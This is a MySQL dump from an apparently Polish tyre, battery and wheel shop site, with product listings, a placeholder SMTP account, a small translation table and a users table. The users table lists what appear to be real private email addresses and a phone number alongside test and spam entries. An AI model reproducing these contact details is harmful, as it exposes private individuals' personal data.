(181, 75, 'Matador MPS320 225/70R15C 112R', '', '', 350.00, '20130306095542_20130220192522_1158.jpg', '2013-03-05 14:12:45', '2013-03-28 12:51:09', 'N', 'Y', 'MPS320', 'Dostawcze', 'Matador', 1, '225/70R15C', 'R - do 170 km/h', 0, '', '112 - do 1120 kg', 1, '', '', '', '', '', '', '', ''),
(182, 80, '215/65R16C', '', '', 0.00, '', '2013-03-05 14:12:59', '2013-03-28 13:32:50', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(183, 75, 'Matador MPS330 215/65R16C 109R', '', '', 375.00, '20130730100140_3435462111.jpg', '2013-03-05 14:15:06', '2013-07-30 08:02:30', 'N', 'Y', 'MPS330', 'Dostawcze', 'Matador', 1, '215/65R16C', 'R - do 170 km/h', 0, '', '109 - do 1030 kg', 1, '', '', '', '', '', '', '', ''),
(184, 75, 'Hankook RA14  235/65R16C 115R ', '', '', 0.00, '20130306100421_20120208123949_hankook_radial_ra14_205_65.jpg', '2013-03-05 14:15:46', '2013-03-06 09:04:21', 'N', 'Y', 'RA14', 'Dostawcze', 'Hankook ', 1, '235/65R16C ', 'R - do 170 km/h', 0, '', '115 - do 1215 kg', 1, '', '', '', '', '', '', '', ''),
(185, 75, 'Sailun 195/75R16C', '', '', 0.00, '20130806221341_3440174091.jpg', '2013-03-05 15:06:02', '2013-08-06 20:13:41', 'N', 'Y', 'COMMERCIO VX1', 'Dostawcze', 'Sailun ', 1, '195/75R16', 'Q - do 160 km/h', 0, '', '107 - do 975 kg', 1, '', '', '', '', '', '', '', ''),
(187, 80, 'Sailun COMMERCIO VX1 205 75 R16C 112R', '', '', 330.00, '20130328095043_1276_1391_large.jpg', '2013-03-15 08:35:25', '2013-03-28 14:17:41', 'N', 'Y', 'COMMERCIO VX1', 'Dostawcze', 'Sailun ', 1, '215/75R16C', 'R - do 170 km/h', 0, '', '112 - do 1120 kg', 1, '', '', '', '', '', '', '', ''),
(188, 80, '215/75R16C', '', '', 0.00, '', '2013-03-18 10:41:40', '2013-03-28 13:33:16', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(189, 75, 'Sava Trenta 215/75R16C 112R', '', '', 330.00, '20130730102039_20130305163532_20120204124604_353.jpg', '2013-03-18 10:41:47', '2013-07-30 08:20:39', 'N', 'Y', 'Trenta', 'Dostawcze', 'Sava', 1, '215/75R16C', 'R - do 170 km/h', 0, '', '112 - do 1120 kg', 1, '', '', '', '', '', '', '', ''),
(190, 80, '235/75R16C', '', '', 0.00, '', '2013-03-18 10:41:57', '2013-03-28 14:18:17', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(191, 90, 'Gał Gum 185R14C 102P', '', '', 0.00, '20130318114901_1332249016_185_80_14c.jpg', '2013-03-18 10:42:35', '2013-03-22 12:32:35', 'N', 'Y', '---', 'Dostawcze', 'Gał Gum', 1, '185R14C', 'N - do 140 km/h', 0, '', '102 - do 850 kg', 1, '', '', '', '', '', '', '', ''),
(192, 80, '195R14C', '', '', 0.00, '', '2013-03-18 10:50:19', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(193, 90, 'Gał Gum 195/70R15C 104R', '', '', 0.00, '20130322115554_1332248956_195_70_15c.jpg', '2013-03-18 10:51:33', '2013-03-22 12:25:23', 'N', 'Y', 'BERLINER', 'Dostawcze', 'Gał Gum', 1, '195/70R15C ', 'R - do 170 km/h', 0, '', '104 - do 900 kg', 1, '', '', '', '', '', '', '', ''),
(194, 90, 'Gał Gum 225/70R15C 104R', '', '', 0.00, '20130322132643_1332249016_185_80_14c.jpg', '2013-03-18 10:52:17', '2013-03-22 12:27:33', 'N', 'Y', 'BERLINER', 'Dostawcze', 'Gał Gum', 1, '225/70R15C ', 'R - do 170 km/h', 0, '', '104 - do 900 kg', 1, '', '', '', '', '', '', '', ''),
(195, 80, '205/75/16C', '', '', 0.00, '', '2013-03-18 10:52:44', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(196, 90, 'Gał Gum 215/75/16C 108R', '', '', 260.00, '20130328095810_20130318114901_1332249016_185_80_14c.jpg', '2013-03-18 10:53:08', '2013-03-28 12:53:38', 'N', 'Y', '', 'Dostawcze', 'Gał Gum', 1, '215/75/16C', 'N - do 140 km/h', 0, '', '108 - do 1000 kg', 1, '', '', '', '', '', '', '', ''),
(197, 81, 'Gał Gum 185R14C', '', '', 0.00, '20130318120033_1334056135_dsc_4953aaa.jpg', '2013-03-18 10:55:30', '2013-03-18 11:01:37', 'N', 'Y', '---', 'Dostawcze', 'Gał Gum', 2, '185R14C', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(198, 80, '195R14C', '', '', 0.00, '', '2013-03-18 10:59:36', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(199, 81, 'Gał Gum GALAXIE 195/70/15C 102', '', '', 0.00, '20130318120318_1334056404_225_70_15.jpg', '2013-03-18 11:02:00', '2013-03-22 12:57:40', 'N', 'Y', 'GALAXIE', 'Dostawcze', 'Gał Gum', 2, '195/70/15C ', 'R - do 170 km/h', 0, '', '102 - do 850 kg', 1, '', '', '', '', '', '', '', ''),
(200, 81, 'Gał Gum GALAXIE 205/65R15 102N', '', '', 0.00, '20130322134644_1334056404_225_70_15.jpg', '2013-03-22 12:22:51', '2013-03-22 12:46:44', 'N', 'Y', 'GALAXIE ', 'Dostawcze', 'Gał Gum', 2, '205/65R15', 'N - do 140 km/h', 0, '', '102 - do 850 kg', 1, '', '', '', '', '', '', '', ''),
(201, 80, '-', '', '', 100.00, '', '2013-08-20 20:08:40', '2013-09-15 10:29:06', 'N', 'Y', '', '', 'Centra STANDARD', 0, '', '', 0, '', '', 3, '24 miesiące ', '12V', '90AH', '720A', '', '', '', ''),
(202, 80, '', '<p style="margin-top: 0px; margin-bottom: 3px; color: rgb(0, 0, 0); font-family: Arial,Helvetica,sans-serif; font-size: 13px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; text-indent: 0px; text-transform: none; white-space: normal; word-spacing: 0px; background-color: rgb(255, 255, 255);">\r\n	&nbsp;</p>\r\n<p style="margin-top: 0px; margin-bottom: 3px; color: rgb(0, 0, 0); font-family: Arial,Helvetica,sans-serif; font-size: 13px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; text-indent: 0px; text-transform: none; white-space: normal; word-spacing: 0px; background-color: rgb(255, 255, 255);">\r\n	&nbsp;</p>\r\n', '', 190.00, '', '2013-08-20 20:09:39', '2013-10-31 13:05:22', 'N', 'Y', '', '', 'DEZENT', 0, '', '', 0, '', '', 2, '', '', '', '', '15 Cali', '6.50 Cali', '5x112', 'ET38'),
(234, 0, '', '', '', 0.00, '', '2013-10-31 13:09:24', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(235, 80, '', '', '', 0.00, '', '2013-10-31 13:09:48', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(236, 67, '', '', '', 0.00, '', '2013-11-04 13:18:25', '2013-11-04 13:19:59', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(237, 67, '', '', '', 0.00, '', '2013-11-08 20:30:24', '2013-11-08 20:33:10', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(238, 67, 'asdas', '', '', 0.00, '', '2013-11-08 20:31:31', '2013-11-08 20:33:35', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(239, 67, '15x6.50 5x112', '', '', 0.00, '', '2014-01-02 14:46:45', '2014-01-02 14:47:33', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 2, '', '', '', '', '', '', '', ''),
(240, 67, 'Kontakt', '', '', 0.00, '', '2014-01-02 14:48:22', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(241, 67, '15x6.50 5x112', '', '', 0.00, '', '2014-01-02 14:48:54', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(203, 92, 'Matador MP92 SUV 205/70R15 96H', '', '', 0.00, '20140102155443_matador_mp92_sibir_snow_suv_205_70_r15_96_h.jpg', '2013-08-21 16:55:54', '2014-01-02 15:07:14', 'N', 'Y', 'MP92 SUV', 'Terenowe', 'Matador', 2, '205/70R15', 'H - do 210 km/h', 0, '', '96', 1, '', '', '', '', '', '', '', ''),
(204, 92, 'Matador 235/75R15 109T', '', '', 370.00, '20140102155458_matador_mp92_sibir_snow_suv_205_70_r15_96_h.jpg', '2013-08-21 16:56:10', '2014-01-02 14:54:58', 'N', 'Y', '', 'Terenowe', 'Matador ', 2, '235/75r15', 'T - do 190 km/h', 0, '', '109- ', 1, '', '', '', '', '', '', '', ''),
(205, 92, 'Nexen WIN-SUV 235/60R16 98H', '', '', 0.00, '20130822200859_nexen_winguard_185_55_r15_82_h.jpg', '2013-08-21 16:56:26', '2014-01-02 14:57:33', 'N', 'Y', 'WIN-SUV', 'Terenowe', 'Nexen', 2, '215/65R16', 'H - do 210 km/h', 0, '', '98 - do 750kg', 1, '', '', '', '', '', '', '', ''),
(206, 92, '215/65R16 98H', '', '', 0.00, '20130822200835_images.jpg', '2013-08-21 16:56:42', '2014-01-02 15:01:28', 'N', 'Y', 'WG-SNOW G', 'Terenowe', 'Nexen', 2, '215/70R16', 'T - do 190 km/h', 0, '', '100', 1, '', '', '', '', '', '', '', ''),
(207, 92, 'Nexen WIN-SUV 215/65R16 98H', '', '', 0.00, '', '2013-08-21 16:57:02', '2014-01-02 15:06:40', 'N', 'Y', 'WIN-SUV', 'Terenowe', 'Nexen', 2, '215/65R16', 'H - do 210 km/h', 0, '', '98 - do 750kg', 1, '', '', '', '', '', '', '', ''),
(208, 92, 'Nexen WG-SNOW G 215/70R16 100T', '', '', 0.00, '', '2013-08-21 16:57:29', '2014-01-02 15:05:29', 'N', 'Y', ' WG-SNOW G', 'Terenowe', 'Nexen', 2, ' 215/70R16 ', 'T - do 190 km/h', 0, '', '100', 1, '', '', '', '', '', '', '', ''),
(209, 92, 'Barum Polaris 3  235/70R16 106T', '', '', 0.00, '', '2013-08-21 16:58:28', '2014-01-02 15:03:59', 'N', 'Y', 'Polaris 3', 'Terenowe', 'Barum ', 2, '235/70R16', 'T - do 190 km/h', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(233, 80, '215/60R17', '', '', 0.00, '', '2013-10-31 13:09:11', '2014-01-02 15:10:28', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(229, 80, '235/65R17', '', '', 0.00, '', '2013-10-31 13:05:49', '2014-01-02 15:10:15', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(230, 67, 'Felga Aluminiowa ENZO H  15x6.50 5x112', '', '', 0.00, '', '2013-10-31 13:07:48', '2013-10-31 13:08:31', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(231, 67, 'felga Aluminiowa ENZO H  15x6.50 5x112', '', '', 0.00, '', '2013-10-31 13:08:08', '2013-10-31 13:08:38', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(232, 67, '', '', '', 0.00, '', '2013-10-31 13:08:52', '2013-11-04 13:24:45', 'Y', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(210, 80, '40ah', '', '', 0.00, '', '2013-09-11 17:11:25', '2013-09-15 10:44:03', 'N', 'Y', '', '', '', 0, '', '', 1, '', '', 1, '', '', '', '', '', '', '', ''),
(211, 63, 'Akumulator BOSCH SILVER S3 12V 45AH 400A', '', '', 190.00, '20130911194215_3519145531.jpg', '2013-09-11 17:11:41', '2013-09-11 17:42:15', 'N', 'Y', '', '', 'BOSCH SILVER S3', 0, '', '', 0, '', '', 3, '24 miesiące', '12V', '45AH', '400A', '', '', '', ''),
(212, 63, 'Akumulator Centra STANDARD 12V 50AH 510A', '', '', 220.00, '20130911195520_3537596595.jpg', '2013-09-11 17:12:31', '2013-09-11 17:55:20', 'N', 'Y', '', '', 'Centra STANDARD', 0, '', '', 0, '', '', 3, '24 miesiące', '12V', '50AH', '510A', '', '', '', ''),
(213, 63, 'Akumulator Centra STANDARD 12V 55AH 460A', '', '', 255.00, '20130911195712_3537596595.jpg', '2013-09-11 17:13:29', '2013-09-11 18:03:07', 'N', 'Y', '', '', 'Centra STANDARD', 0, '', '', 1, '', '', 3, '24 miesiące', '12V', '55AH', '460A', '', '', '', ''),
(214, 0, '55ah', '', '', 0.00, '', '2013-09-11 17:24:00', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(215, 63, 'Akumulator BOSCH SILVER S3 12V 60AH 540A', '', '', 270.00, '20130911202019_3519176520.jpg', '2013-09-11 17:27:32', '2013-09-11 18:20:19', 'N', 'Y', '', '', ' BOSCH SILVER S3', 0, '', '', 0, '', '', 3, '24 miesiące', '12V', '60AH', '540A', '', '', '', ''),
(216, 0, '60ah', '', '', 0.00, '', '2013-09-11 17:37:55', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(217, 63, 'Akumulator Centra STANDARD 12V 65AH 540A', '', '', 310.00, '20130915124138_3542804145.jpg', '2013-09-11 17:38:04', '2013-09-15 10:59:26', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 3, '24 miesiące ', '12V', ' 65AH', '540A', '', '', '', ''),
(218, 0, '62ah', '', '', 0.00, '', '2013-09-11 17:38:30', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(219, 63, 'Akumulator Centra STANDARD 12V 70AH 640A', '', '', 310.00, '20130915123229_20130820222504_akumulator_centra_standard_90ah_720a_p_cc900.jpg', '2013-09-11 17:38:44', '2013-09-15 10:59:41', 'N', 'Y', '', '', 'Centra STANDARD', 0, '', '', 0, '', '', 3, '24 miesiące ', '12V', '70AH', '640A', '', '', '', ''),
(220, 0, '70ah', '', '', 0.00, '', '2013-09-11 17:39:03', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(221, 63, 'Akumulator BOSCH SILVER S4 12V 74AH 680A', '', '', 330.00, '20130915124505_3519574446.jpg', '2013-09-11 17:39:12', '2013-09-15 10:59:58', 'N', 'Y', '', '', 'BOSCH SILVER S4', 0, '', '', 0, '', '', 3, '24 miesiące ', '12V', '74AH', '680A', '', '', '', ''),
(222, 0, '75ah', '', '', 0.00, '', '2013-09-11 17:39:30', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(223, 0, '80ah', '', '', 0.00, '', '2013-09-11 17:39:59', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(224, 80, '', '', '', 0.00, '', '2013-09-15 10:26:53', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(225, 63, 'Akumulator Centra STANDARD 12V 90AH 720A', '', '', 350.00, '20130915122846_20130820222504_akumulator_centra_standard_90ah_720a_p_cc900.jpg', '2013-09-15 10:27:53', '2013-09-15 11:00:17', 'N', 'Y', '', '', 'Centra STANDARD', 0, '', '', 0, '', '', 3, '24 miesiące ', '12V', '90AH', '720A', '', '', '', ''),
(226, 80, '100ah', '', '', 0.00, '', '2013-09-15 10:36:57', '0000-00-00 00:00:00', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(227, 63, 'Akumulator Centra 6V 165AH 900A ', '', '', 0.00, '', '2013-10-31 12:48:53', '2013-10-31 13:10:42', 'N', 'Y', '', '', '', 0, '', '', 0, '', '', 1, '', '', '', '', '', '', '', ''),
(228, 67, 'Felga Aluminiowa DEZENT 15x6.50 5x112', '<p>\r\n	<span style="margin: 0px; padding: 0px; border: 0px; font-family: verdana; font-size: 12pt; vertical-align: baseline;"><font face="Arial" size="3">Pasują do :&nbsp;</font></span><span style="margin: 0px; padding: 0px; border: 0px; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; font-weight: bold; vertical-align: baseline;">VOLKSWAGEN PASSAT, CADDY, GOLF</span><span style="margin: 0px; padding: 0px; border: 0px; font-family: Arial, Helvetica, sans-serif; font-size: 10pt; font-weight: bold; vertical-align: baseline;">&nbsp;5</span><font face="Arial, Helvetica, sans-serif" style="font-size: 13px;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">AUDI A3, A4, A6 SEAT ALHAMBRA</strong></font></p>\r\n', '', 0.00, '20131031140506_20130820221858_3455653574.jpg', '2013-10-31 12:49:03', '2013-10-31 13:05:06', 'N', 'Y', '', '', 'DEZENT', 0, '', '', 0, '', '', 2, '', '', '', '', '15 Cali', '6.50 Cali', '5x112', 'ET38');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `smtp_account`
--

CREATE TABLE IF NOT EXISTS `smtp_account` (
  `id_smtp_account` int(11) NOT NULL AUTO_INCREMENT,
  `mail` varchar(255) NOT NULL,
  `host` varchar(255) NOT NULL,
  `user` varchar(255) NOT NULL,
  `pass` varchar(255) NOT NULL,
  `smtpauth` enum('Y','N') NOT NULL DEFAULT 'N',
  `default` enum('Y','N') NOT NULL DEFAULT 'N',
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_smtp_account`),
  UNIQUE KEY `mail` (`mail`),
  KEY `deleted` (`deleted`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Zrzut danych tabeli `smtp_account`
--

INSERT INTO `smtp_account` (`id_smtp_account`, `mail`, `host`, `user`, `pass`, `smtpauth`, `default`, `added`, `modified`, `deleted`) VALUES
(1, 'konto@domenna.pl', 'mail.domena.pl', 'user', 'haslo', 'Y', 'Y', '2009-11-20 09:17:11', '2010-08-17 09:26:32', 'N');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `translate`
--

CREATE TABLE IF NOT EXISTS `translate` (
  `id_translate` int(7) unsigned NOT NULL AUTO_INCREMENT,
  `key` text NOT NULL,
  `pl` text NOT NULL,
  `en` text NOT NULL,
  `de` text NOT NULL,
  `sk` text NOT NULL,
  `cz` text NOT NULL,
  `hu` text NOT NULL,
  `ro` text NOT NULL,
  `coments` text NOT NULL,
  PRIMARY KEY (`id_translate`),
  KEY `key` (`key`(255))
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Zrzut danych tabeli `translate`
--

INSERT INTO `translate` (`id_translate`, `key`, `pl`, `en`, `de`, `sk`, `cz`, `hu`, `ro`, `coments`) VALUES
(1, 'tytul', 'HealthThink public relations', 'HealthThink public relations', '', '', '', '', '', ''),
(2, 'tresc', 'Kreujemy zdrowe inicjatywy', '', '', '', '', '', '', '');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) COLLATE utf8_polish_ci NOT NULL,
  `phone` varchar(255) COLLATE utf8_polish_ci NOT NULL,
  `added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `active` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_polish_ci AUTO_INCREMENT=23 ;

--
-- Zrzut danych tabeli `users`
--

INSERT INTO `users` (`id`, `email`, `phone`, `added`, `active`) VALUES
(2, 'mariusz24245@hgmail.com', 'aaa', '2011-12-06 22:51:18', 1),
(3, 'Podaj swój email', 'Podaj swój numer telefonu', '2011-12-06 22:55:22', 1),
(4, '', 'Podaj swój numer telefonu', '2011-12-06 22:55:38', 1),
(5, 'asdasdasd', 'foasdasd', '2011-12-06 22:57:15', 1),
(6, 'a', 'a', '2011-12-06 22:57:58', 1),
(7, 'asdasd', 'asdasd', '2011-12-06 22:58:14', 1),
(8, 'asfsdfs', 'swdfsfd', '2011-12-06 22:59:37', 1),
(9, 'asdas', 'asdasd', '2011-12-06 22:59:59', 1),
(10, 'mariusz24245@gmail.com', 'asd', '2011-12-08 10:01:40', 1),
(11, 'rfilipkowski889@gmail.com', '889267173', '2011-12-14 07:34:52', 1),
(12, 'sugvin@fsgdfj.com', '86294948379', '2012-01-23 01:20:47', 1),
(13, 'przemek40@buziaczek.pl', 'Podaj swój numer telefonu', '2012-03-10 11:22:34', 1),
(14, 'skocio@o2.pl', 'Podaj swój numer telefonu', '2012-05-10 06:29:18', 1),
(15, 'skocio1@o2.pl', 'Podaj swój numer telefonu', '2012-05-10 06:29:48', 1),
(16, 'robfil889@wp.pl', 'Podaj swój numer telefonu', '2013-03-28 13:02:22', 1),
(17, 'unwingmum@carpet-cleaner-northampton.co.uk', '123456', '2013-10-26 01:10:33', 1),
(18, 'info@wulkanizacja-szczuczyn.pl', '', '2013-10-30 20:06:40', 1),
(19, 'innopiEra@carpet-cleaner-northampton.co.uk', '123456', '2013-11-08 20:00:05', 1),
(20, 'dnkbehea@foficcjb.com', 'Podaj swÃ³j numer telefonu', '2014-04-30 17:15:17', 1),
(21, 'cherylBiz@47t.de', '123456', '2014-09-11 03:39:19', 1),
(22, 'christitamp@47t.de', '123456', '2014-12-29 21:39:03', 1);

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `_log`
--

CREATE TABLE IF NOT EXISTS `_log` (
  `id_operator` int(11) unsigned NOT NULL,
  `query` text NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `_map`
--

CREATE TABLE IF NOT EXISTS `_map` (
  `field` varchar(255) NOT NULL,
  `value` varchar(255) NOT NULL,
  `page` int(11) NOT NULL DEFAULT '0',
  `language` varchar(2) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Zrzut danych tabeli `_map`
--

INSERT INTO `_map` (`field`, `value`, `page`, `language`) VALUES
('root', '1', 1, 'pl'),
('skip', '3', 1, 'pl');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
